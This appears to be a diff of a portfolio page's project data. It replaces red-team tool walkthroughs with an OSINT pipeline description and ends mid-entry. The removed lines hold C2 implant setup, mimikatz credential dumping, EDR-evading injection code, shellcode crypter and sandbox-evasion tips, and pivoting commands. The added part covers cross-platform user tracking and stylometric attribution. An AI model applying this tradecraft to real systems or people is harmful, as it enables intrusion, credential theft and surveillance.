@@ -955,145 +955,54 @@ Q+ykhYbs6z9CIMNV3y+yOgo=
     // PROJECT DATA WITH FULL WALKTHROUGH CONTENT
     // ====================================================
     const PROJECTS = [
-      {
-        title: "ShadowStrike - Custom C2 Framework",
-        tags: ["C++", "Networking", "Evasion"],
-        description: "Lightweight command and control framework with built-in AV/EDR evasion, encrypted C2 channels, and modular payload system. Supports HTTP/S, DNS, and custom protocol communications.",
+    {
+        title: "iKnowItAll - OSINT Intelligence Pipeline",
+        tags: ["Python", "OSINT", "Automation", "Data Correlation"],
+        description: "Modular, automated open-source intelligence toolkit capable of collecting, correlating, and reporting intelligence from multiple concurrent sources. Built with 9 specialized tools unified into a single pipeline.",
         status: "active",
+        github: "https://github.com/yourusername/iKnowItAll",
         walkthrough: {
-          tabs: ["Overview", "Architecture", "Setup", "Usage", "Notes"],
-          content: [
-            // Overview
-            {
-              type: "overview",
-              body: `ShadowStrike is a lightweight, modular C2 (Command & Control) framework written in C++ designed for red team operations. It prioritizes stealth and evasion over raw feature count.\n\nThe framework supports three transport protocols out of the box — HTTP/S, DNS, and a custom binary protocol — with the ability to hot-swap between them during an engagement if C2 traffic gets flagged.`,
-              tech: ["C++17", "OpenSSL", "libcurl", "CMake", "Python (teamserver UI)"]
-            },
-            // Architecture
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Teamserver",
-                  desc: "The Python-based teamserver acts as the central hub. It handles operator connections, tracks implant beacons, and dispatches tasking. Communication between operators and the teamserver is done over mTLS.",
-                  code: null
-                },
-                {
-                  title: "Implant / Agent",
-                  desc: "The C++ implant is compiled per-engagement with embedded config (sleep interval, jitter, C2 addresses, kill date). It uses indirect syscalls to avoid userland hooks and runs entirely in memory.",
-                  code: null
-                },
-                {
-                  title: "Listener",
-                  desc: "Listeners are stood up on the teamserver side. Each listener type (HTTP, DNS, raw TCP) has its own handler. Redirectors (Apache/Nginx) sit in front of real C2 infrastructure.",
-                  code: null
-                },
-                {
-                  title: "Transport Encryption",
-                  desc: "All C2 traffic is encrypted with AES-256-GCM. The symmetric key is negotiated over an asymmetric handshake on first beacon using an embedded operator-generated keypair.",
-                  code: null
-                }
-              ]
-            },
-            // Setup
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Clone & build the teamserver",
-                  desc: "Requires Python 3.10+ and the dependencies listed in requirements.txt.",
-                  code: `<span class="prompt">$</span> <span class="cmd">git clone</span> https://github.com/n0rm41/shadowstrike\n<span class="prompt">$</span> <span class="cmd">cd</span> shadowstrike/teamserver\n<span class="prompt">$</span> <span class="cmd">pip install</span> -r requirements.txt\n<span class="prompt">$</span> <span class="cmd">python3</span> server.py --port 443 --cert certs/server.pem`
-                },
-                {
-                  title: "Generate implant config",
-                  desc: "Use the built-in config generator to produce an implant_config.h header before compiling.",
-                  code: `<span class="prompt">$</span> <span class="cmd">python3</span> scripts/gen_config.py \\\n    --c2 <span class="string">https://your-redirector.com</span> \\\n    --sleep <span class="string">30</span> --jitter <span class="string">15</span> \\\n    --kill-date <span class="string">2025-06-01</span> \\\n    -o implant/src/implant_config.h`
-                },
-                {
-                  title: "Compile the implant",
-                  desc: "Cross-compile for Windows from Linux using mingw-w64, or build natively on a Windows dev box.",
-                  code: `<span class="prompt">$</span> <span class="cmd">cd</span> implant\n<span class="prompt">$</span> <span class="cmd">cmake</span> -DCMAKE_TOOLCHAIN_FILE=cmake/mingw.cmake -B build\n<span class="prompt">$</span> <span class="cmd">cmake</span> --build build --target shadowstrike_implant\n<span class="comment"># Output: build/shadowstrike_implant.exe</span>`
-                },
-                {
-                  title: "Connect as operator",
-                  desc: "Use the CLI client or the web UI to connect to the running teamserver.",
-                  code: `<span class="prompt">$</span> <span class="cmd">python3</span> client.py \\\n    --host 127.0.0.1 --port 443 \\\n    --cert certs/operator.pem \\\n    --operator <span class="string">n0rm41</span>`
-                }
-              ]
-            },
-            // Usage
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "List active beacons",
-                  desc: "Once an implant is executed on a target, it will beacon back and appear in the sessions list.",
-                  code: `<span class="prompt">shadowstrike></span> sessions\n\n  ID    HOSTNAME         USER           PID    LAST SEEN\n  ----  ---------------  -------------  -----  ---------\n  1     CORP-WS-042      CORP\\jsmith    4821   2s ago\n  2     DC-01            NT AUTH\\SYS    892    8s ago`
-                },
-                {
-                  title: "Interact with a beacon",
-                  desc: "Drop into an interactive session with a specific beacon ID.",
-                  code: `<span class="prompt">shadowstrike></span> interact 1\n<span class="prompt">[beacon:1]></span> shell whoami\n<span class="comment">  corp\\jsmith</span>\n<span class="prompt">[beacon:1]></span> upload /tmp/mimikatz.exe C:\\Windows\\Temp\\m.exe\n<span class="prompt">[beacon:1]></span> run C:\\Windows\\Temp\\m.exe sekurlsa::logonpasswords`
-                },
-                {
-                  title: "Switch transport protocol",
-                  desc: "If HTTP traffic is getting flagged, hot-swap to DNS without losing the session.",
-                  code: `<span class="prompt">[beacon:1]></span> transport dns\n<span class="comment">  [*] Switching to DNS transport...</span>\n<span class="comment">  [+] DNS tunnel established via ns1.corp.local</span>`
-                }
-              ]
-            },
-            // Notes
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "OPSEC Warning", body: "Always deploy behind a redirector. Never expose the real teamserver IP. Use Nginx or Apache with malleable C2 profiles to blend in with legitimate traffic." },
-                { type: "tip", title: "Sleep & Jitter", body: "Set sleep intervals of 30-60s with 20-30% jitter for long-term operations. Low sleep = more detections from EDR behavioral analytics." },
-                { type: "note", title: "Kill Date", body: "Always compile with a kill date. If the implant falls into the hands of a blue team researcher after an engagement, it will self-terminate rather than continue beaconing." },
-                { type: "tip", title: "Roadmap", body: "Planned additions: BOF (Beacon Object File) support, P2P (peer-to-peer) implant chaining, and a Malleable C2 profile system similar to Cobalt Strike." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "MemoryHunter - Process Injection Toolkit",
-        tags: ["C#", "Windows API", "Injection"],
-        description: "Collection of advanced process injection techniques including APC injection, thread hijacking, process hollowing, and reflective DLL injection with syscall stubs for EDR bypass.",
-        status: "active",
-        walkthrough: {
-          tabs: ["Overview", "Techniques", "Code Examples", "Detection Notes"],
+          tabs: ["Overview", "Architecture", "Core Tools", "Correlation Engine", "Usage"],
           content: [
             {
               type: "overview",
-              body: `MemoryHunter is a research toolkit cataloging and implementing modern process injection techniques for Windows targets. Each technique is implemented as a self-contained module that can be invoked individually or chained.\n\nPrimary goal: understand how offensive tooling achieves code execution in remote processes, and document detection opportunities for defenders.`,
-              tech: ["C#", ".NET 6", "P/Invoke", "D/Invoke", "Windows API"]
+              body: `iKnowItAll is a modular OSINT automation framework built in Python. It aggregates intelligence from web scraping, username enumeration, IP analysis, news monitoring, forum tracking, and change detection — then correlates findings across all sources to surface actionable intelligence.
+
+The correlation engine identifies overlaps in usernames, URLs, timing, and even writing style across disparate data sources, making it possible to track entities and attribute activity across the web.`,
+              tech: ["Python 3", "requests", "BeautifulSoup", "Playwright", "concurrent.futures", "Tor/stem", "feedparser"]
             },
             {
               type: "steps",
               steps: [
                 {
-                  title: "Classic CreateRemoteThread Injection",
-                  desc: "The most basic form — allocate memory in a remote process, write shellcode, create a thread. Detected by almost every modern EDR but good to understand as a baseline.",
+                  title: "Modular Tool Design",
+                  desc: "Each intelligence source is a standalone module that can be used independently or integrated into the unified pipeline. All modules return normalized data structures for correlation.",
                   code: null
                 },
                 {
-                  title: "APC (Asynchronous Procedure Call) Injection",
-                  desc: "Queue an APC to a thread in an alertable state. More stealthy than CRT injection as it doesn't create a new thread. Effective against processes that regularly enter alertable wait states.",
+                  title: "Concurrent Collection",
+                  desc: "ThreadPoolExecutor runs all collection modules simultaneously. News scraper checks 40+ RSS feeds, IP tool queries 4 APIs, username enumerator checks 10+ platforms — all in parallel.",
+                  code: `<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor
+
+<span class="keyword">with</span> ThreadPoolExecutor(max_workers=10) <span class="keyword">as</span> executor:
+    news_future = executor.submit(scrape_news, keywords)
+    forum_future = executor.submit(scrape_forums, keywords)
+    ip_future = executor.submit(analyze_ip, target_ip)
+    
+    results = {
+        <span class="string">'news'</span>: news_future.result(),
+        <span class="string">'forums'</span>: forum_future.result(),
+        <span class="string">'ip'</span>: ip_future.result()
+    }`
+                },
+                {
+                  title: "Correlation Engine",
+                  desc: "After collection, the correlation engine analyzes findings to identify connections: username overlap, URL/domain overlap, temporal proximity (events within 24hrs), and stylometric similarity (writing fingerprint matching).",
                   code: null
                 },
                 {
-                  title: "Process Hollowing",
-                  desc: "Spawn a legitimate process in suspended state, unmap its memory, write a malicious PE in its place, then resume execution. The resulting process looks legitimate to casual inspection.",
-                  code: null
-                },
-                {
-                  title: "Reflective DLL Injection",
-                  desc: "Load a DLL from memory without touching disk or calling LoadLibrary. The DLL contains its own loader that maps itself into memory. Bypass many AV products that scan disk writes.",
-                  code: null
-                },
-                {
-                  title: "Thread Stack Spoofing",
-                  desc: "Manipulate thread call stacks to hide the origin of execution from EDR stack analysis. More advanced — masks the presence of shellcode in memory by presenting a fake but plausible call stack.",
+                  title: "Report Generation",
+                  desc: "Outputs both CSV (structured data) and HTML (human-readable intelligence briefing with dark theme). The HTML report highlights correlations with visual indicators.",
                   code: null
                 }
               ]
@@ -1102,1196 +1011,1306 @@ Q+ykhYbs6z9CIMNV3y+yOgo=
               type: "steps",
               steps: [
                 {
-                  title: "D/Invoke syscall stub (direct syscall)",
-                  desc: "Use D/Invoke to call NT syscalls directly without going through ntdll.dll, bypassing userland hooks placed by EDR.",
-                  code: `<span class="comment">// D/Invoke dynamic invocation of NtAllocateVirtualMemory</span>\n<span class="keyword">var</span> data = <span class="keyword">new</span> DInvoke.Data.PE.PE_MANUAL_MAP();\n<span class="keyword">var</span> syscall = DInvoke.DynamicInvoke.Generic.GetSyscallStub(\n    <span class="string">"NtAllocateVirtualMemory"</span>\n);\n\n<span class="keyword">var</span> ntAVM = (<span class="keyword">DELEGATES</span>.NtAllocateVirtualMemory)\nMarshal.GetDelegateForFunctionPointer(syscall,\n    <span class="keyword">typeof</span>(DELEGATES.NtAllocateVirtualMemory));\n\nntAVM(processHandle, <span class="keyword">ref</span> baseAddr,\n      IntPtr.Zero, <span class="keyword">ref</span> regionSize,\n      AllocationType.Commit | AllocationType.Reserve,\n      MemoryProtection.ExecuteReadWrite);`
+                  title: "Web Scraper",
+                  desc: "Scrapes static HTML websites with pagination support. Includes browser impersonation via User-Agent rotation and exponential backoff for rate limiting.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python scraper.py</span> --url https://target.com/data --pages 5
+<span class="comment">  [*] Scraping page 1...</span>
+<span class="comment">  [*] Scraping page 2...</span>
+<span class="comment">  [+] Scraped 247 records → output.csv</span>`
                 },
                 {
-                  title: "APC Injection implementation",
-                  desc: "Queue shellcode execution as an APC on a thread in the target process.",
-                  code: `<span class="comment">// Find a thread in an alertable state</span>\n<span class="keyword">var</span> threads = Process.GetProcessesByName(<span class="string">"explorer"</span>)\n                     [0].Threads;\n\n<span class="keyword">foreach</span> (ProcessThread t <span class="keyword">in</span> threads) {\n    IntPtr hThread = OpenThread(\n        ThreadAccess.SET_CONTEXT, <span class="keyword">false</span>, (uint)t.Id);\n    \n    <span class="comment">// Write shellcode to remote process first</span>\n    QueueUserAPC(shellcodeAddr, hThread, IntPtr.Zero);\n    \n    CloseHandle(hThread);\n}`
+                  title: "Username Enumerator",
+                  desc: "Checks a username across 10+ platforms simultaneously (GitHub, Twitter, Reddit, Instagram, etc.). Concurrent requests with smart 404/403/200 handling.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python enumerate.py</span> --username target_user
+<span class="comment">  [+] GitHub: https://github.com/target_user</span>
+<span class="comment">  [+] Reddit: https://reddit.com/user/target_user</span>
+<span class="comment">  [+] Twitter: https://twitter.com/target_user</span>
+<span class="comment">  [-] Instagram: Not found</span>`
+                },
+                {
+                  title: "IP Intelligence Tool",
+                  desc: "Correlates data from Shodan, AbuseIPDB, ip-api.com, and reverse DNS lookups. Detects VPN/proxy/hosting infrastructure. All 4 APIs queried concurrently.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python iptool.py</span> --ip 203.0.113.42
+<span class="comment">  [Shodan] Open ports: 80, 443, 22</span>
+<span class="comment">  [AbuseIPDB] Confidence: 0% (clean)</span>
+<span class="comment">  [ip-api] ISP: Digital Ocean (hosting)</span>
+<span class="comment">  [DNS] PTR: droplet-42.digitalocean.com</span>`
+                },
+                {
+                  title: "Tor Session Manager",
+                  desc: "Routes traffic through Tor SOCKS5 proxy with circuit rotation via stem library. Verifies anonymity by checking exit node IP. Reusable module.",
+                  code: `<span class="keyword">from</span> tor_session <span class="keyword">import</span> TorSession
+
+session = TorSession()
+session.rotate_circuit()  <span class="comment"># New exit node</span>
+
+resp = session.get(<span class="string">'https://check.torproject.org'</span>)
+<span class="keyword">print</span>(session.get_current_ip())  <span class="comment"># Shows exit node</span>`
+                },
+                {
+                  title: "JavaScript Scraper",
+                  desc: "Handles JavaScript-rendered pages using Playwright browser automation. Full Chromium instance scrapes dynamic content invisible to requests.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python js_scraper.py</span> --url https://dynamic-site.com
+<span class="comment">  [*] Launching headless Chromium...</span>
+<span class="comment">  [*] Waiting for JS render...</span>
+<span class="comment">  [+] Scraped 189 elements → output.csv</span>`
+                },
+                {
+                  title: "News Intelligence Scraper",
+                  desc: "Scrapes 40+ RSS feeds from global news sources concurrently. Keyword-based relevance scoring (title matches weighted 3x body). Sorted output.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python news_scraper.py</span> --keywords <span class="string">"cybersecurity breach"</span>
+<span class="comment">  [*] Checking 42 RSS feeds...</span>
+<span class="comment">  [+] Found 18 relevant articles</span>
+<span class="comment">  [+] Top match: "Major Healthcare Breach..." (score: 6)</span>`
+                },
+                {
+                  title: "Multi-Forum Aggregator",
+                  desc: "Scrapes Reddit (5 subreddits, hot + new) and HackerNews simultaneously. Adapter pattern normalizes data. Deduplication and keyword scoring.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python forum_scraper.py</span> --keywords <span class="string">"zero day"</span>
+<span class="comment">  [*] Scraping r/netsec, r/blackhat, r/ReverseEngineering...</span>
+<span class="comment">  [*] Scraping HackerNews...</span>
+<span class="comment">  [+] Found 23 posts (12 Reddit, 11 HN)</span>`
+                },
+                {
+                  title: "Change Monitoring System",
+                  desc: "Monitors URLs for content changes via SHA-256 hashing. Persistent state in JSON. Generates unified diffs showing exact changes.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python change_monitor.py</span> --add https://target.com/page
+<span class="comment">  [+] Now monitoring https://target.com/page</span>
+
+<span class="prompt">$</span> <span class="cmd">python change_monitor.py</span> --check
+<span class="comment">  [!] CHANGE DETECTED on https://target.com/page</span>
+<span class="comment">  --- Original</span>
+<span class="comment">  +++ Current</span>
+<span class="comment">  @@ -12,3 +12,3 @@</span>
+<span class="comment">  -Version 1.2.3</span>
+<span class="comment">  +Version 1.2.4</span>`
+                }
+              ]
+            },
+            {
+              type: "steps",
+              steps: [
+                {
+                  title: "Username Overlap Detection",
+                  desc: "If a username appears in both news articles and forum posts, flag it as a correlation. Useful for tracking individuals across platforms.",
+                  code: `<span class="comment"># Example correlation:</span>
+<span class="comment"># Username "h4x0r_dev" found in:</span>
+<span class="comment">#   - HackerNews post about kernel exploits</span>
+<span class="comment">#   - News article comments on security breach</span>
+<span class="comment">#   → Correlated entity</span>`
+                },
+                {
+                  title: "URL/Domain Overlap",
+                  desc: "Extracts all URLs from news and forums, normalizes domains, flags overlaps. Surfaces infrastructure or campaigns referenced across sources.",
+                  code: `<span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse
+
+<span class="keyword">def</span> extract_domain(url):
+    <span class="keyword">return</span> urlparse(url).netloc
+
+domains_news = {extract_domain(u) <span class="keyword">for</span> u <span class="keyword">in</span> news_urls}
+domains_forums = {extract_domain(u) <span class="keyword">for</span> u <span class="keyword">in</span> forum_urls}
+overlap = domains_news & domains_forums`
+                },
+                {
+                  title: "Temporal Correlation",
+                  desc: "Events occurring within 24 hours of each other are flagged. Useful for tracking coordinated campaigns or incident response timelines.",
+                  code: `<span class="keyword">from</span> email.utils <span class="keyword">import</span> parsedate_to_datetime
+
+time_a = parsedate_to_datetime(article[<span class="string">'published'</span>])
+time_b = parsedate_to_datetime(post[<span class="string">'created'</span>])
+
+<span class="keyword">if</span> abs((time_a - time_b).total_seconds()) < 86400:
+    correlations.append((<span class="string">'temporal'</span>, article, post))`
+                },
+                {
+                  title: "Stylometric Similarity",
+                  desc: "Writing fingerprint analysis. Compares linguistic patterns across posts to attribute authorship. Detects if the same person is posting under different usernames.",
+                  code: `<span class="comment"># Simplified stylometric features:</span>
+<span class="comment"># - Average sentence length</span>
+<span class="comment"># - Lexical diversity (unique words / total words)</span>
+<span class="comment"># - Punctuation frequency</span>
+<span class="comment"># - Function word usage patterns</span>
+<span class="comment"># If fingerprints match → likely same author</span>`
+                }
+              ]
+            },
+            {
+              type: "steps",
+              steps: [
+                {
+                  title: "Full pipeline execution",
+                  desc: "Run all modules, correlate findings, generate reports.",
+                  code: `<span class="prompt">$</span> <span class="cmd">python iKnowItAll.py</span> \
+    --keywords <span class="string">"APT28 campaign"</span> \
+    --username suspect_user \
+    --ip 203.0.113.42 \
+    --output intel_report
+
+<span class="comment">  [*] Running news scraper (40+ feeds)...</span>
+<span class="comment">  [*] Running forum aggregator (Reddit + HN)...</span>
+<span class="comment">  [*] Running username enumeration...</span>
+<span class="comment">  [*] Running IP analysis...</span>
+<span class="comment">  [*] Correlating findings...</span>
+<span class="comment">  [+] Found 3 username overlaps</span>
+<span class="comment">  [+] Found 2 domain overlaps</span>
+<span class="comment">  [+] Found 1 temporal correlation</span>
+<span class="comment">  [+] Reports saved:</span>
+<span class="comment">      intel_report.csv</span>
+<span class="comment">      intel_report.html</span>`
                 }
               ]
             },
             {
               type: "notes",
               items: [
-                { type: "note", title: "Detection Vectors", body: "Most EDRs hook NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtCreateThreadEx in userland. Direct syscalls bypass these hooks. However, kernel-level callbacks (PsSetCreateThreadNotifyRoutine) still fire." },
-                { type: "warn", title: "OpSec Consideration", body: "Thread call stack analysis is becoming common. After injection, use stack spoofing or sleep in a wait state rather than spinning in a loop, which creates obvious CPU anomalies." },
-                { type: "tip", title: "Testing", body: "Test against Windows Defender + AMSI before moving to commercial EDR. If you pass WD, you're ~70% of the way there. Then test on a lab with CrowdStrike Falcon or SentinelOne." }
+                { type: "tip", title: "API Keys", body: "Shodan and AbuseIPDB require free API keys. Sign up at shodan.io and abuseipdb.com. Store keys in environment variables or a config file, never hardcode." },
+                { type: "warn", title: "Rate Limits", body: "All tools include exponential backoff retry logic. If you hit rate limits, the tool will automatically slow down. For heavy scraping, consider rotating proxies or using Tor session manager." },
+                { type: "note", title: "Legal Use Only", body: "This toolkit is for authorized OSINT research, threat intelligence, and educational purposes only. Always respect robots.txt, terms of service, and applicable laws. Do not use for unauthorized surveillance or harassment." },
+                { type: "tip", title: "Tor Setup", body: "Tor session manager requires Tor to be running locally. Install with apt install tor on Linux or download Tor Browser Bundle. The control port (9051) must be accessible and authentication configured." }
               ]
             }
           ]
         }
-      },
-      {
-        title: "ADRecon Pro - Active Directory Enumeration",
-        tags: ["PowerShell", "LDAP", "Active Directory"],
-        description: "Comprehensive Active Directory reconnaissance tool with automated attack path identification, ACL analysis, and credential hunting capabilities. Integrates with BloodHound.",
-        status: "active",
-        walkthrough: {
-          tabs: ["Overview", "Features", "Usage", "Attack Paths"],
-          content: [
-            {
-              type: "overview",
-              body: `ADRecon Pro is a PowerShell-based Active Directory enumeration framework built for red team engagements. It wraps and extends native AD cmdlets to pull structured, actionable data with minimal noise on the wire.\n\nIt outputs results compatible with BloodHound for graph-based attack path visualization, and generates a standalone HTML report for sharing with clients.`,
-              tech: ["PowerShell 5.1+", "ADSI", "LDAP", "BloodHound JSON", ".NET"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Domain Enumeration",
-                  desc: "Pulls domain SID, functional level, password policies, trusts, and site topology automatically on launch."
-                },
-                {
-                  title: "User & Group Enumeration",
-                  desc: "Enumerates all users, groups, and nested group memberships. Flags privileged accounts and those with AdminCount=1."
-                },
-                {
-                  title: "ACL / DACL Analysis",
-                  desc: "Analyzes access control lists across all AD objects. Flags dangerous rights: WriteDACL, GenericAll, GenericWrite, AllExtendedRights on sensitive targets."
-                },
-                {
-                  title: "Kerberoastable Account Detection",
-                  desc: "Identifies accounts with SPNs set (excluding computer accounts), sorted by password age — older passwords = easier to crack."
-                },
-                {
-                  title: "ASREPRoastable Account Detection",
-                  desc: "Lists accounts with 'Do not require Kerberos preauthentication' set."
-                },
-                {
-                  title: "GPO Enumeration",
-                  desc: "Maps Group Policy Objects to OUs, flags GPOs with potentially dangerous settings (autologon credentials, mapped drives with creds, etc.)."
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Basic enumeration",
-                  desc: "Run from any domain-joined machine as a standard domain user.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">Import-Module</span> .\\ADReconPro.psm1\n<span class="prompt">PS C:\\></span> <span class="cmd">Invoke-ADRecon</span> -Domain corp.local -OutputDir C:\\Temp\\recon\n\n<span class="comment">[*] Starting ADRecon Pro v2.1...</span>\n<span class="comment">[*] Enumerating domain: corp.local</span>\n<span class="comment">[+] Found 847 users, 132 groups, 23 OUs</span>\n<span class="comment">[+] Found 12 Kerberoastable accounts</span>\n<span class="comment">[+] Found 3 ASREPRoastable accounts</span>\n<span class="comment">[+] Found 7 dangerous ACL paths</span>\n<span class="comment">[*] BloodHound JSON written to C:\\Temp\\recon\\bh_corp.json</span>`
-                },
-                {
-                  title: "Target a specific user for ACL analysis",
-                  desc: "Trace what rights a compromised user has across the domain.",
-                  code: `<span class="prompt">PS C:\\></span> <span class="cmd">Get-DangerousACLPaths</span> -Identity <span class="string">"corp\\jsmith"</span>\n\n<span class="comment">  [!] jsmith has GenericWrite on GROUP: Help Desk</span>\n<span class="comment">  [!] jsmith has WriteDACL on USER: svc_backup</span>\n<span class="comment">  [!] Help Desk has GenericAll on OU: Server Admins</span></span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "LDAP Queries", body: "ADRecon uses paged LDAP queries to avoid hitting the 1000-object server-side limit. On large domains (10k+ objects) this still takes a few minutes — normal." },
-                { type: "note", title: "BloodHound Integration", body: "Import the generated JSON directly into BloodHound GUI. Use the 'Shortest Paths to Domain Admin' query first, then 'Shortest Paths to High Value Targets'." },
-                { type: "warn", title: "OPSEC", body: "LDAP enumeration generates EventID 1644 (expensive queries) on DCs with auditing enabled. Spread queries over time or use the --stealth flag which paces requests." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "PhantomLoader - Shellcode Crypter",
-        tags: ["Rust", "Cryptography", "Obfuscation"],
-        description: "Multi-stage shellcode crypter with polymorphic stub generation, entropy analysis, and sandbox detection. Supports AES-256, XOR, and custom encryption schemes.",
-        status: "active",
-        walkthrough: {
-          tabs: ["Overview", "Encryption Pipeline", "Usage", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `PhantomLoader is a shellcode crypter and loader written in Rust. It takes raw shellcode (e.g., from msfvenom or your custom implant), encrypts it through multiple layers, generates a polymorphic stub loader, and produces a final PE or shellcode blob.\n\nThe generated loader performs sandbox evasion checks before decrypting and executing the payload in-memory.`,
-              tech: ["Rust", "AES-256-GCM", "ChaCha20-Poly1305", "LLVM", "PE format"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Stage 1: Entropy normalization",
-                  desc: "High-entropy blobs (encrypted shellcode) are trivially flagged by static scanners. PhantomLoader spreads entropy by interspersing encrypted bytes with 'junk' data that's stripped at runtime."
-                },
-                {
-                  title: "Stage 2: Multi-layer encryption",
-                  desc: "Shellcode is encrypted with a randomly-chosen inner algorithm (XOR with rolling key, AES-128-CBC) then wrapped with AES-256-GCM. Keys are derived from runtime environment values."
-                },
-                {
-                  title: "Stage 3: Polymorphic stub generation",
-                  desc: "The decryption stub is generated fresh each time with randomized variable names, reordered equivalent instructions, and junk code insertion. No two stubs share a static signature."
-                },
-                {
-                  title: "Stage 4: Sandbox detection",
-                  desc: "Before executing, the loader checks: running process count, screen resolution, CPU cores, memory size, uptime, and user interaction timing. If it looks like a sandbox, it sleeps or executes a benign payload."
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Encrypt shellcode",
-                  desc: "Point PhantomLoader at your raw shellcode file.",
-                  code: `<span class="prompt">$</span> <span class="cmd">cargo build</span> --release\n<span class="prompt">$</span> ./target/release/phantom_loader \\\n    --input shellcode.bin \\\n    --output loader.exe \\\n    --format pe \\\n    --encrypt aes256 \\\n    --sandbox-checks all\n\n<span class="comment">  [*] Input shellcode: 87,040 bytes</span>\n<span class="comment">  [*] Applying entropy normalization...</span>\n<span class="comment">  [*] Encrypting with AES-256-GCM...</span>\n<span class="comment">  [*] Generating polymorphic stub...</span>\n<span class="comment">  [+] Output: loader.exe (156,672 bytes)</span>\n<span class="comment">  [+] Entropy: 6.12 (was 7.98)</span>`
-                },
-                {
-                  title: "Test sandbox detection logic",
-                  desc: "Dry-run the sandbox checks to verify they fire in your own VM before testing on target.",
-                  code: `<span class="prompt">$</span> ./phantom_loader --sandbox-test\n\n<span class="comment">  [+] Process count:      112  (threshold: 50)  PASS</span>\n<span class="comment">  [+] CPU cores:          4    (threshold: 2)   PASS</span>\n<span class="comment">  [+] RAM:                16GB (threshold: 4GB) PASS</span>\n<span class="comment">  [+] Screen res:         1920x1080             PASS</span>\n<span class="comment">  [+] Uptime:             14.2h                 PASS</span>\n<span class="comment">  [*] All checks passed — proceeding to execute</span>`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "tip", title: "Key Derivation", body: "For hardened targets, enable --env-keying. This derives the decryption key from machine-specific values (hostname hash, domain SID). The loader won't decrypt on any other machine — even if extracted from memory." },
-                { type: "warn", title: "VirusTotal", body: "Never upload your actual operational payloads to VirusTotal. Use isolated test shellcode. VT shares uploads with AV vendors — your real payload will be signatured immediately." },
-                { type: "note", title: "Entropy Note", body: "Dropping entropy below 7.0 is generally enough to bypass static file scanners. Dynamic analysis (actually running the file in a sandbox) is a separate concern — that's what the sandbox checks address." }
-              ]
-            }
-          ]
-        }
-      },
-      {
-        title: "NetGhost - Network Pivoting Tool",
-        tags: ["Go", "Networking", "Tunneling"],
-        description: "Advanced network tunneling and pivoting tool supporting SOCKS5, port forwarding, and reverse port forwarding through multiple hops with minimal footprint.",
-        status: "in-progress",
-        walkthrough: {
-          tabs: ["Overview", "Architecture", "Usage", "Notes"],
-          content: [
-            {
-              type: "overview",
-              body: `NetGhost is a Go-based network pivoting framework for red team engagements. It allows operators to route traffic through multiple compromised hosts to reach otherwise-unreachable internal segments.\n\nStatus: actively in development. Core SOCKS5 and port-forward features work. Reverse pivoting and multi-hop chaining are still being built out.`,
-              tech: ["Go 1.22", "SOCKS5", "TLS 1.3", "QUIC (planned)"]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Agent-to-teamserver reverse tunnel",
-                  desc: "The NetGhost agent (deployed on a pivot host) reaches out to the operator's server and establishes a persistent reverse tunnel. No inbound firewall rules required on the pivot."
-                },
-                {
-                  title: "SOCKS5 proxy",
-                  desc: "Once a tunnel is up, NetGhost exposes a SOCKS5 interface on the operator machine. Tools like proxychains or Burp Suite route through this to reach internal hosts."
-                },
-                {
-                  title: "Port forward",
-                  desc: "Forward a specific port on the pivot host to a port on the operator's machine, or vice versa. Useful for specific tool requirements that don't support SOCKS."
-                },
-                {
-                  title: "Multi-hop chaining (WIP)",
-                  desc: "Chain multiple pivot agents together to reach deeply nested network segments. Each hop is a separate TLS-encrypted tunnel. Currently limited to 2 hops — working on n-hop support."
-                }
-              ]
-            },
-            {
-              type: "steps",
-              steps: [
-                {
-                  title: "Start the server on your VPS",
-                  desc: "The server listens for incoming agent connections and exposes the SOCKS5 interface to operators.",
-                  code: `<span class="prompt">$</span> <span class="cmd">go build</span> -o netghost_server ./cmd/server\n<span class="prompt">$</span> ./netghost_server \\\n    --port 4444 \\\n    --cert tls/server.pem \\\n    --socks5-port 1080\n\n<span class="comment">  [*] NetGhost server listening on :4444</span>\n<span class="comment">  [*] SOCKS5 proxy on 127.0.0.1:1080</span>`
-                },
-                {
-                  title: "Deploy and run the agent on the pivot",
-                  desc: "Copy the agent binary to the pivot host. Run it pointing at your server.",
-                  code: `<span class="prompt">C:\\></span> netghost_agent.exe \\\n    --server <span class="string">your-vps.com:4444</span> \\\n    --retry 30\n\n<span class="comment">  [*] Connecting to your-vps.com:4444...</span>\n<span class="comment">  [+] Tunnel established</span>`
-                },
-                {
-                  title: "Use SOCKS5 with proxychains",
-                  desc: "Once the tunnel is up, configure proxychains to use 127.0.0.1:1080 and route any tool through it.",
-                  code: `<span class="comment"># /etc/proxychains4.conf</span>\n[ProxyList]\nsocks5  127.0.0.1  1080\n\n<span class="prompt">$</span> <span class="cmd">proxychains</span> nmap -sT -Pn 10.10.10.0/24\n<span class="prompt">$</span> <span class="cmd">proxychains</span> crackmapexec smb 10.10.10.0/24`
-                }
-              ]
-            },
-            {
-              type: "notes",
-              items: [
-                { type: "warn", title: "WIP Notice", body: "NetGhost is under active development. The multi-hop chaining feature is not stable. Use with caution in production engagements — test thoroughly in your lab first." },
